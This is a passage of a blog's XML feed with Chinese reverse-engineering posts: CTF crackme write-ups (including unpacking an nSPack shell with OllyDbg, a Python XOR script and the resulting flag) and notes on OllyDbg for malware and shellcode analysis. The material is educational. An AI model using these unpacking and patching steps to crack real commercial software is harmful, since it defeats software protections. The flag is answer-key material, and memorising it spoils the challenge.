        &lt;h1 id=&quot;逆向的难点、如何进阶和逆向其他题型&quot;&gt;&lt;a href=&quot;#逆向的难点、如何进阶和逆向其他题型&quot; class=&quot;headerlink&quot; title=&quot;逆向的难点、如何进阶和逆向其他题型&quot;&gt;&lt;/a&gt;逆向的难点、如何进阶和逆向其他题型&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
      <category term="i春秋" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/i%E6%98%A5%E7%A7%8B/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="i春秋" scheme="https://kabeor.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
  </entry>
  
  <entry>
    <title>逆向的定义和核心</title>
    <link href="https://kabeor.github.io/%E9%80%86%E5%90%91%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E6%A0%B8%E5%BF%83/"/>
    <id>https://kabeor.github.io/逆向的定义和核心/</id>
    <published>2019-03-31T05:59:01.745Z</published>
    <updated>2018-07-14T10:49:33.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向的定义和核心"><a href="#逆向的定义和核心" class="headerlink" title="逆向的定义和核心"></a>逆向的定义和核心</h1><p><img src="https://i.loli.net/2018/07/14/5b49d50101064.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d50126ac9.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d5014bb4c.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d5016fd69.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d50195bb3.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d501bc366.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d501e3796.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d50215bfa.jpg" alt="mark">!</p><p><img src="https://i.loli.net/2018/07/14/5b49d5023a801.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d50263bd4.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d52d1742c.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d52d3cc68.jpg" alt="mark"></p><p>From <a href="https://kabeor.github.io/逆向的定义和核心/">https://kabeor.github.io/逆向的定义和核心/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;逆向的定义和核心&quot;&gt;&lt;a href=&quot;#逆向的定义和核心&quot; class=&quot;headerlink&quot; title=&quot;逆向的定义和核心&quot;&gt;&lt;/a&gt;逆向的定义和核心&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2018/07/14/5b49d5
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
      <category term="i春秋" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/i%E6%98%A5%E7%A7%8B/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="i春秋" scheme="https://kabeor.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
  </entry>
  
  <entry>
    <title>逆向的基础和入门</title>
    <link href="https://kabeor.github.io/%E9%80%86%E5%90%91%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E5%85%A5%E9%97%A8/"/>
    <id>https://kabeor.github.io/逆向的基础和入门/</id>
    <published>2019-03-31T05:59:01.745Z</published>
    <updated>2018-07-14T10:50:05.919Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向的基础和入门"><a href="#逆向的基础和入门" class="headerlink" title="逆向的基础和入门"></a>逆向的基础和入门</h1><p><img src="https://i.loli.net/2018/07/14/5b49d552b4f94.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d552db7c4.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d5530cfe4.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d55334e63.jpg" alt="mark"></p><p>From <a href="https://kabeor.github.io/逆向的基础和入门/">https://kabeor.github.io/逆向的基础和入门/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;逆向的基础和入门&quot;&gt;&lt;a href=&quot;#逆向的基础和入门&quot; class=&quot;headerlink&quot; title=&quot;逆向的基础和入门&quot;&gt;&lt;/a&gt;逆向的基础和入门&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2018/07/14/5b49d5
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
      <category term="i春秋" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/i%E6%98%A5%E7%A7%8B/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="i春秋" scheme="https://kabeor.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
  </entry>
  
  <entry>
    <title>逆向的地位作用</title>
    <link href="https://kabeor.github.io/%E9%80%86%E5%90%91%E7%9A%84%E5%9C%B0%E4%BD%8D%E4%BD%9C%E7%94%A8/"/>
    <id>https://kabeor.github.io/逆向的地位作用/</id>
    <published>2019-03-31T05:59:01.745Z</published>
    <updated>2018-07-14T10:47:57.714Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向的地位作用"><a href="#逆向的地位作用" class="headerlink" title="逆向的地位作用"></a>逆向的地位作用</h1><p><img src="https://i.loli.net/2018/07/14/5b49d4db33ae2.jpg" alt="mark"></p><p>From <a href="https://kabeor.github.io/逆向的地位作用/">https://kabeor.github.io/逆向的地位作用/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;逆向的地位作用&quot;&gt;&lt;a href=&quot;#逆向的地位作用&quot; class=&quot;headerlink&quot; title=&quot;逆向的地位作用&quot;&gt;&lt;/a&gt;逆向的地位作用&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2018/07/14/5b49d4db33
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
      <category term="i春秋" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/i%E6%98%A5%E7%A7%8B/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="i春秋" scheme="https://kabeor.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
  </entry>
  
  <entry>
    <title>第八届swpu网络安全大赛逆向r2 r3</title>
    <link href="https://kabeor.github.io/%E7%AC%AC%E5%85%AB%E5%B1%8Aswpu%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%80%86%E5%90%91r2%20r3/"/>
    <id>https://kabeor.github.io/第八届swpu网络安全大赛逆向r2 r3/</id>
    <published>2019-03-31T05:59:01.730Z</published>
    <updated>2018-09-04T03:07:48.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第八届swpu网络安全大赛逆向r2-r3"><a href="#第八届swpu网络安全大赛逆向r2-r3" class="headerlink" title="第八届swpu网络安全大赛逆向r2 r3"></a>第八届swpu网络安全大赛逆向r2 r3</h1><p>也是以前的题了</p><h2 id="R2：bin100"><a href="#R2：bin100" class="headerlink" title="R2：bin100"></a>R2：bin100</h2><p>打开程序<br><img src="https://i.loli.net/2018/09/04/5b8deefecd76d.jpg" alt></p><p>。。。。。什么也没有<br>尝试输入，输到16位后提醒重试<br>用OD打开</p><p>界面像是输序列号，正好在看雪论坛看到以下内容</p><p><img src="https://i.loli.net/2018/09/04/5b8def1d19c71.jpg" alt></p><p>于是查找windowtextA</p><p><img src="https://i.loli.net/2018/09/04/5b8def2d25c46.jpg" alt><br><img src="https://i.loli.net/2018/09/04/5b8def34d0fae.jpg" alt></p><p>一直F8，看到cmp，应该是判断输入是否满足16位<br>打开IDA ，F5看伪代码</p><p><img src="https://i.loli.net/2018/09/04/5b8def45a9635.jpg" alt></p><p>然后接下来应记下关键跳转的地址，在IDA中分析，<br>输入的数字经过一系列计算，最后与一个字符串对比<br>得出flag</p><h2 id="R3：bin200"><a href="#R3：bin200" class="headerlink" title="R3：bin200"></a>R3：bin200</h2><p>先查壳</p><p><img src="https://i.loli.net/2018/09/04/5b8defbc9e8a2.jpg" alt></p><p>VC++写的<br>先用IDA调试：<br>查找字符串，发现一串数字08067<br>跟随后F5</p><p><img src="https://i.loli.net/2018/09/04/5b8defccf0ede.jpg" alt></p><p>可以看到result=8，应该是要对比已通关数和总关数8<br>然后跟着往下发现对比的if语句，找到相等时的跳转的地址，在OD上找到这个地址，就可以找出flag</p><p>From <a href="https://kabeor.github.io/第八届swpu网络安全大赛逆向r2 r3/">https://kabeor.github.io/第八届swpu网络安全大赛逆向r2 r3/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第八届swpu网络安全大赛逆向r2-r3&quot;&gt;&lt;a href=&quot;#第八届swpu网络安全大赛逆向r2-r3&quot; class=&quot;headerlink&quot; title=&quot;第八届swpu网络安全大赛逆向r2 r3&quot;&gt;&lt;/a&gt;第八届swpu网络安全大赛逆向r2 r3&lt;/h1&gt;&lt;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>第三届上海市大学生网络安全大赛crackme</title>
    <link href="https://kabeor.github.io/%E7%AC%AC%E4%B8%89%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bcrackme/"/>
    <id>https://kabeor.github.io/第三届上海市大学生网络安全大赛crackme/</id>
    <published>2019-03-31T05:59:01.730Z</published>
    <updated>2018-07-15T15:18:48.711Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第三届上海市大学生网络安全大赛crackme"><a href="#第三届上海市大学生网络安全大赛crackme" class="headerlink" title="第三届上海市大学生网络安全大赛crackme"></a>第三届上海市大学生网络安全大赛crackme</h1><p>用PEID查壳</p><p><img src="https://i.loli.net/2018/07/15/5b4b6580a49f8.jpg" alt="image"></p><p>发现是个nSPack的壳</p><blockquote><p>手脱</p></blockquote><p><img src="https://i.loli.net/2018/07/15/5b4b6580b764f.jpg" alt="image"></p><p>OD自动载入之后停在了这里，发现是pushfd和pushad</p><p>所以有两种方法</p><p>A：popad寻找法</p><p>用Ctrl+F去查找popad</p><p>B：ESP定律法</p><p>第一个命令先F8，单步执行</p><p><img src="https://i.loli.net/2018/07/15/5b4b6580cc0cc.jpg" alt="image"></p><p>在ESP右击，选择数据窗口中跟随</p><p><img src="https://i.loli.net/2018/07/15/5b4b6580df236.jpg" alt="image"></p><p>跟踪这个值</p><p>选中46 02 00 00这四个字节，右击断点，硬件访问，Dword，选择</p><p>然后F9运行，跳转到这儿</p><p><img src="https://i.loli.net/2018/07/15/5b4b6581003d2.jpg" alt="image"></p><p>看到了这个长跳转，知道了401336离OEP很近了，单步F8，再次单步</p><p><img src="https://i.loli.net/2018/07/15/5b4b6581150e7.jpg" alt="image"></p><p>所以，1621是OEP的RVA</p><p>接下来是用PETools来DUMP文件</p><p>在PETools选中这个crackme，右击选择，完整转存</p><p>然后是使用Import REC</p><p><img src="https://i.loli.net/2018/07/15/5b4b658127cbc.jpg" alt="image"></p><p>点击IAT AutoSearch，Get Imports</p><p>然后把OEP改成1621</p><p><img src="https://i.loli.net/2018/07/15/5b4b65813cf35.jpg" alt="image"></p><p>Fix Dump</p><p>选中刚才Dump的文件<br><img src="https://i.loli.net/2018/07/15/5b4b65815165f.jpg" alt="image"></p><p>然后再使用PETools</p><p>Tools - Rebuild PE，重建那个DUMP文件<br><img src="https://i.loli.net/2018/07/15/5b4b659ad5787.jpg" alt="image"></p><p>脱壳成功</p><p>IDA查看Strings，发现有error和right：</p><p><img src="https://i.loli.net/2018/07/15/5b4b659ae8c4d.jpg" alt="image"></p><p><img src="https://i.loli.net/2018/07/15/5b4b659b090f5.jpg" alt="image"></p><p><img src="https://i.loli.net/2018/07/15/5b4b659b1d992.jpg" alt="mark"><br>开头的t就是74h换算过来的ASCII码116，摁R就能看到</p><p>Python脚本<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serial_1 = <span class="string">"this_is_not_flag"</span></span><br><span class="line">serial_2 = [<span class="number">0x12</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">0x14</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0x4a</span>,<span class="number">0x3d</span>,<span class="number">0x56</span>,<span class="number">0xa</span>,<span class="number">0x10</span>,<span class="number">0x67</span>,<span class="number">0</span>,<span class="number">0x41</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x46</span>,<span class="number">0x5a</span>,<span class="number">0x44</span>,<span class="number">0x42</span>,<span class="number">0x6e</span>,<span class="number">0x0c</span>,<span class="number">0x44</span>,<span class="number">0x72</span>,<span class="number">0x0c</span>,<span class="number">0x0d</span>,<span class="number">0x40</span>,<span class="number">0x3e</span>,<span class="number">0x4b</span>,<span class="number">0x5f</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0x4c</span>,<span class="number">0x5e</span>,<span class="number">0x5b</span>,<span class="number">0x17</span>,<span class="number">0x6e</span>,<span class="number">0xc</span>,<span class="number">0x16</span>,<span class="number">0x68</span>,<span class="number">0x5b</span>,<span class="number">0x12</span>,<span class="number">0x48</span>,<span class="number">0x0e</span>]</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">42</span>):</span><br><span class="line">    result += chr(serial_2[i] ^ ord(serial_1[i%<span class="number">16</span>]))</span><br><span class="line">    <span class="keyword">print</span> result</span><br></pre></td></tr></table></figure></p><p>  得出</p><p>  flag{59b8ed8f-af22-11e7-bb4a-3cf862d1ee75}</p><p>From <a href="https://kabeor.github.io/第三届上海市大学生网络安全大赛crackme/">https://kabeor.github.io/第三届上海市大学生网络安全大赛crackme/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第三届上海市大学生网络安全大赛crackme&quot;&gt;&lt;a href=&quot;#第三届上海市大学生网络安全大赛crackme&quot; class=&quot;headerlink&quot; title=&quot;第三届上海市大学生网络安全大赛crackme&quot;&gt;&lt;/a&gt;第三届上海市大学生网络安全大赛crack
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
      <category term="i春秋Reverse赛题" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/i%E6%98%A5%E7%A7%8BReverse%E8%B5%9B%E9%A2%98/"/>
    
    
      <category term="CTF" scheme="https://kabeor.github.io/tags/CTF/"/>
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="i春秋" scheme="https://kabeor.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
  </entry>
  
  <entry>
    <title>第9章 OllyDbg</title>
    <link href="https://kabeor.github.io/%E7%AC%AC9%E7%AB%A0%20OllyDbg/"/>
    <id>https://kabeor.github.io/第9章 OllyDbg/</id>
    <published>2019-03-31T05:59:01.699Z</published>
    <updated>2018-09-02T12:36:57.441Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OllyDbg"><a href="#OllyDbg" class="headerlink" title="OllyDbg"></a>OllyDbg</h1><p>OllyDbg被普遍用来分析恶意代码之前,最初的用途是破解软件。 Immunity Security公司买下 OllyDbg1.1的基础代码,并将其更名为Immunity Debugger(ImmDbg)。在此之前, OllyDbg直都是恶意代码分析师和漏洞开发者们的首选调试器。Immunity的目的是使这个工具适合漏洞开发者们使用,并且修复了OllDbg中的一些Bug。<br>在完成 OllyDbg的外观GUI修改,提供带有完整功能的 Python解释器API后,一些用户开始用ImmDbg替代OllyDbg</p><h2 id="9x1-加载恶意代码"><a href="#9x1-加载恶意代码" class="headerlink" title="9x1 加载恶意代码"></a>9x1 加载恶意代码</h2><h3 id="1-打开一个可执行文件"><a href="#1-打开一个可执行文件" class="headerlink" title="1. 打开一个可执行文件"></a>1. 打开一个可执行文件</h3><p>选择OllyDbg界面中的File-&gt;Open, 然后浏览到要加载的可执行文件。<br>如果要调试的程序需要参数,则在Open对话框的 Arguments输入框给出(只能在加载期间给OllyDgb传入命令行参数)</p><p>默认情况下,如果能够确定软件的入口点位置,即 WinMain, OllyDbg会在这个位置暂停程序的执行。否则OllyDbg会在软件PE头部提供的入口点处中断。另外,你也可以选择 OllyDbg的DebuggingOptions菜单(Options→Debugging Options)来修改这些启动选项。</p><h3 id="2-附加调试器到一个运行程序"><a href="#2-附加调试器到一个运行程序" class="headerlink" title="2. 附加调试器到一个运行程序"></a>2. 附加调试器到一个运行程序</h3><p>为将OllyDbg附加到一个进程上,选择OllyDbg界面的File→ Attach。然后会弹出一个菜单,你可以在这个菜单中选择要附加的进程(如果有多个同名的进程,你需要知道调试进程的ID)。接下来选择要调试的进程,并从菜单中选择Attach。此刻OllyDbg会立即暂停这个程序以及它所有的线程。</p><p>OllyDbg附加上进程后,进程当前执行线程的代码会被暂停,并显示在OllyDbg的窗口中。然而，有可能在进程正在执行一个系统DLL中的指令时把它暂停了,当这种情况发生时,回到主代码最简单的办法就是在整个代码段中设置一个访问断点。这样就会让这个程序在下次访问代码段时中断执行。</p><h2 id="9x2-OllyDbg的接口"><a href="#9x2-OllyDbg的接口" class="headerlink" title="9x2 OllyDbg的接口"></a>9x2 OllyDbg的接口</h2><blockquote><p> <strong>反汇编面板窗口</strong><br> 这个窗口显示了被调试程序的代码一当前指令指针的前后一些指令。通常，下一条将要被执行的指令在这个窗口中高亮显示。如果想要修改指令或数据(或添加一些汇编指令),请在这个窗口中按空格键。</p><p><strong>寄存器面板窗口</strong><br>这个窗口用来显示被调试程序寄存器的当前状态，代码被调试时，如果一条指令运行过程中修改了寄存器的值，则寄存器窗口中的这个寄存器就会从黑色变为红色。</p><p><strong>栈面板窗口</strong><br>这个窗口用来显示被调试线程堆栈在内存中的当前状态。这个窗口总是显示给定线程的栈项。可以通过右击一个栈单元，选择Modify，来操作这个窗口中的栈。OllyDbg会在一些栈单元上显示一些有用的注释，这些注释描述了调用一个API之前栈中存放的参数。</p><p><strong>内存转储面板窗口</strong><br>这个窗口用来显示被调试进程的实时内存转储。在这个窗口中按CtrI+G组合键，并输入一个内存位置，可以跳转到任何内存地址（也可以单击一个内存地址，然后选择Follow in Dump，来转储那个内存地址）。如果想要编辑这个窗口中的内存，右击它并选择Binary-&gt;Edit。使用这种方式也可以修改恶意代码存储在RAM中的全局变量以及其他一些数据。</p></blockquote><h2 id="9x3-内存映射"><a href="#9x3-内存映射" class="headerlink" title="9x3 内存映射"></a>9x3 内存映射</h2><p>内存映射窗口( View-&gt;Memory)显示了被调试程序分配的所有内存块。<br>内存映射是查看程序在内存中布局的一个好方式。你可以双击内存映射中的任意一行，显示那个段的内存转储。你也可以通过右击一段内存转储，然后选择View in Disassembler的方式，将其中的数据发送到反汇编窗口。</p><h3 id="1-基地址重定位"><a href="#1-基地址重定位" class="headerlink" title="1. 基地址重定位"></a>1. 基地址重定位</h3><p>内存映射能够帮助你理解一个PE文件在运行时如何被重定位。基地址重定位是指Windows中的一个模块没有被加载到其预定基地址时发生的情况。</p><blockquote><p><strong>基地址</strong><br>   Windows中的所有PE文件都有一个预定的基地址，它在PE文件头中被称为映像基地址。</p><p>  Windows允许映像基地址与要被加载到内存的实际地址不一致，虽然大部分情况下是一致的。大部分执行程序都被预定加载到0x00400000处，这个地址是Windows平台下大多数编译器使用的默认地址。不过，开发者可以选择将执行程序的基地址设置为一个与此不同的地址。支持地址空间布局随机化( ASLR)安全增强特性的可执行程序会经常被重定位。这就是说.DLL的重定位变得更加普遍。<br>    因为一个应用程序可能导入许多DLL，而每个DLL都有一个希望被加载到内存中的预定基地址，所以重定位十分必要。假设有两个DLL被加载，并且它们拥有相同的预加载地址0x10000000，则它们不可能都加载到这个位置,Windows会将其中一个DLL加载到这个地址，另一个DLL重定位到另外某个地址。<br>    Windows操作系统自带的大多数DLL有不同的预定基地址，而且它们之间不会产生冲突。然而第三方应用程序会经常出现使用同一个预定基地址的情况。</p><p><strong>绝对地址与相对地址</strong><br>重定位过程比简单将代码加载到另一个位置要复杂得多。虽然多数指令会引用内存中的相对地址，但是有些却引用内存的绝对地址。</p></blockquote><h2 id="9x4-查看线程和堆栈"><a href="#9x4-查看线程和堆栈" class="headerlink" title="9x4 查看线程和堆栈"></a>9x4 查看线程和堆栈</h2><p>恶意代码经常使用多线程。你可以通过选择View-&gt;Threads，调出线程面板窗口，查看一个程序的当前线程。这个窗口显示了线程的内存位置，以及它们当前的活动状态（活动、暂停，或者挂起）。<br>    由OllyDbg是单线程的，可能需要你先暂停所有的线程，设置一个断点后，继续运行程序，这样可以确保在一个特定线程内调试。单击主工具栏中的暂停按钮，可以暂停所有活动的线程。</p><h2 id="9x5-执行代码"><a href="#9x5-执行代码" class="headerlink" title="9x5 执行代码"></a>9x5 执行代码</h2><p><img src="https://i.loli.net/2018/07/20/5b519235da3c2.jpg" alt="im"></p><h2 id="9x6-断点"><a href="#9x6-断点" class="headerlink" title="9x6 断点"></a>9x6 断点</h2><p><img src="https://i.loli.net/2018/07/20/5b5192c91c650.jpg" alt="enter description here"></p><h3 id="1-软件断点"><a href="#1-软件断点" class="headerlink" title="1. 软件断点"></a>1. 软件断点</h3><p>调试字符串解码函数时，软件断点特别有用。</p><h3 id="2-条件断点"><a href="#2-条件断点" class="headerlink" title="2. 条件断点"></a>2. 条件断点</h3><p>条件断点是软件断点的一种，只有某些条件得到满足时这个断点才能中断执行程序。OllyDbg调试器允许使用表达式，来设置断点，每当断点命中时，都会先计算表达式的值，如果其值不等于零，断点生效，程序运行中断。</p><p>对于调用频繁的API函数，仅当特定参数传给它时才中断程序执行，这种情况下，条件软件断点特别有用。</p><blockquote><p><strong>设置条件断点的步骤</strong></p><ol><li>右击反汇编面板窗口中函数的第一条指令，选择Breakpoint-&gt;Conditional。然后会弹出一个对话框，要求你输入条件表达式.</li><li>在步骤l弹出的对话框中输入表达式，然后单击OK按钮。</li><li>单击Play按钮，并等待条件断点命中。</li></ol></blockquote><h3 id="3-硬件断点"><a href="#3-硬件断点" class="headerlink" title="3. 硬件断点"></a>3. 硬件断点</h3><p>硬件断点非常强大，它可以在不改变你的代码、堆栈以及任何目标资源的前提下进行调试。</p><p>OllyDbg中，在某一指令上设置硬件断点的方法是：右击该指令选择Breakpoint-&gt;Hardware，on Execution。</p><p>通过使用Debugging Options菜单，你可以告诉OllyDbg默认使用硬件断点来代替软件断点。同时，使用硬件断点可以帮助你防御反调试技术，如软件断点扫描。</p><h3 id="4-内存断点"><a href="#4-内存断点" class="headerlink" title="4. 内存断点"></a>4. 内存断点</h3><p>在一个内存块上设置内存断点，可以让被调试程序在访问这段内存时中断执行。OllyDbg支持软件内存断虑和硬件内存断点，此外还支持对内存进行读、写、执行或其他权限访问是否产生中断的设置。</p><p>为了设置一个基本的内存断点，在内存转储面板窗口中选择一部分内存，或者在内存映射面板窗口中选择一个内存段，然后右击它，选择Breakpoint-&gt;Memory,on Access。OllyDbg只允许你一次设置一个内存断点。如果你设置了一个新的内存断点，那么之前设置的内存断点会被移除。</p><p>在分析恶意代码时，如果想知道恶意代码何时使用了某个加载的DLL，这时内存断点将变得特别有用。可以设置这样一个内存断点，当DLL中的代码运行时程序被中断。下面是实现这种功能的步骤：</p><blockquote><p>1．打开内存映射面板窗门，并右i键单击需要跟踪DLL的.text段（.text段包含DLL的可执行代码）。<br>2．选择Set Memory Breakpoint on Access.<br>3．按F9键或者单击Play按钮恢复程序运行。<br>    当心用程序运行到DLL的．text段代码时．会中断执行。</p></blockquote><h2 id="9x7-加载DLL"><a href="#9x7-加载DLL" class="headerlink" title="9x7 加载DLL"></a>9x7 加载DLL</h2><p>除了可以调试加载的或者附加的可执行程序，OllyDbg还可以调试DLL。然而由于DLL不能直接运行．OllyDbg使用了一个名为loaddll. exe的虚拟程序来加载它。由于恶意代码经常打包成DLL．且其大部分代码都包含在DLL的DlIMain函数（DLL的初始化函数，当DLL被加载到进程时被调用）中，因此OllyDbg的这种技术非常有用。默认情况下，一旦DLL被加载，OllyDbg会在DLL的入口点(DllMain)处中断。</p><p>如果要用参数调用被调试DLL中的导出函数，首先用OllyDbg加载DLL．然后在其入口点处暂停DLL的执行，最后单击Play按钮，运行DllMain函数，以及其他一些DLL要求的初始化操作。</p><h2 id="9x8-跟踪"><a href="#9x8-跟踪" class="headerlink" title="9x8 跟踪"></a>9x8 跟踪</h2><p>跟踪是一种强大的调试技术，它可以记录程序详细的运行信息，供你查阅。OllyDbg支持多种跟踪功能，包括：标准回溯跟踪、堆栈调用跟踪和运行跟踪等。</p><h3 id="1-标准回溯跟踪"><a href="#1-标准回溯跟踪" class="headerlink" title="1. 标准回溯跟踪"></a>1. 标准回溯跟踪</h3><p>每次你在反汇编面板窗口上执行Step Into和Step Over操作时，OllyDbg都会记录下这种动作。你可以使用键盘上的减号键（一）。退回到上一步运行的指令：使用加号键(+)．执行下一条指令。<br>如果使用Step Into，你可以跟踪每一步的执行。如果使用Step Over，只能单步跟踪step over之前区域，回溯之后再决定是否进入另一个区域。</p><h3 id="2-堆栈调用跟踪"><a href="#2-堆栈调用跟踪" class="headerlink" title="2. 堆栈调用跟踪"></a>2. 堆栈调用跟踪</h3><p>在OllyDbg中，通过堆栈跟踪可以查看一个给定函数的执行路径。为了查看堆栈调用，在主菜单中选择View-&gt;Call Stack．会弹出一个窗口，窗口中显示了当前位置之前的调用序列。<br>    为了跟踪堆栈调用，单击地址或者堆栈调用窗口中的某段。当你在那个堆栈位置时，寄存器和堆栈并不会显示什么，除非你执行运行跟踪操作。</p><h3 id="3-运行跟踪"><a href="#3-运行跟踪" class="headerlink" title="3. 运行跟踪"></a>3. 运行跟踪</h3><p>运行跟踪是指在运行代码时，OllyDbg会保存所有运行过的指令，以及它们运行过程中对寄存器和标志所做的改变。</p><blockquote><p><strong>几种激活运行跟踪的方法</strong><br>·  在反汇编面板窗口中高亮你要跟踪的代码。右键单击代码，选择Run Trace–Add Selection。代码运行后，选择View-&gt;Run Trace，查看运行过的指令。使用键盘上的一（减号键）和+（加号键），来上下浏览代码（与标准回溯跟踪小节讨论的一样）。使用这种方法，可以查看每条指令执行时所有寄存器发生的变化。<br>    ·  使用Trace Into与Trace Ovcr选项。这些选项比Add Selection更容易使用，因为它们不需要你选择需要跟踪的代码。Trace Into可以单步执行并且记录命中断点前所有的运行指令，但Trace Over仅记录当前正在运行函数的指令。<br>·  选择Select Debug-&gt;Set Condition。可以在命中条件使程序暂停之前，跟踪程序的运行。如果你想在条件断点命中时停止跟踪，并且从发生中断的位置，回溯跟踪查看如何或者为什么发生中断，这种跟踪方法将对你非常有帮助。</p></blockquote><h3 id="4-跟踪Poison-lvy"><a href="#4-跟踪Poison-lvy" class="headerlink" title="4. 跟踪Poison lvy"></a>4. 跟踪Poison lvy</h3><h2 id="9x9-异常处理"><a href="#9x9-异常处理" class="headerlink" title="9x9 异常处理"></a>9x9 异常处理</h2><p>默认情况下．OllyDbg被附加后会产生异常，附加程序也会停止运行，此时调试器开始接管控制权。调试器可以处理该异常，也可以将异常转到被调试的应用程序处理。当异常发生时．OllyDbg会暂停运行，然后你可以使用下列任一种方法，来决定是否将异常转到应用程序处理：</p><blockquote><p>·  Shift+F7将进入异常。<br>·  Shift+F8将跳过异常。<br>·  Shift+F9将运行异常处理。</p></blockquote><p>OllyDbg提供异常处理的选项，这些选项可以告诉调试器忽略某些特定异常，并且将它们直接转到应用程序处理。<br><img src="https://i.loli.net/2018/07/20/5b519f1aae2be.png" alt="im"></p><h2 id="9x10-修补"><a href="#9x10-修补" class="headerlink" title="9x10 修补"></a>9x10 修补</h2><p>OllyDbg可以很容易修改实时数据，如寄存器和标志。它也可以将汇编形式的修补代码直接插入到一个程序。你可以通过高亮选择某块区域来修改指令或内存，右击这块区域，选择Binary-&gt;Edit，会弹出让你添加操作码和数据的窗口（OllyDbg具有一些特殊功能，可以使用00项或NOP指令填充程序）。</p><h2 id="9x11-分析shellcode"><a href="#9x11-分析shellcode" class="headerlink" title="9x11 分析shellcode"></a>9x11 分析shellcode</h2><p>OllyDbg有一种分析shellcodc的简单方法。下面是使用这种方法的步骤:</p><blockquote><p>1．将shellcode从一个十六进制编辑器复制到剪切板。<br>2．在内存映射面板窗口中，选择类型为Priv的内存区域（这是分配给进程的私有内存，与只读的可执行镜像不同，这些内存被多个进程共享）。<br>3．双击内存映射面板窗口的某行，会弹出一个十六进制转储窗口，你可以检查它的内容。该区域应该包含几百个连续为0的字节。<br>4．在内存映射面板窗口中，右击被选择的区域，选择Set Access—Full Access，赋予该区域读、写、运行的权限。<br>5．返回内存转储窗口。0字节填充的高亮区域足以容纳整个sheUcode，右键单击选择的内存区域，然后选择Binary一Binary Paste。这个操作将步骤l中复制的shellcode粘贴到选择的区域。<br>6．设置EIP寄存器，指向你修改的内存区域（右击反汇编面板窗口的一条指令，选择New Origin 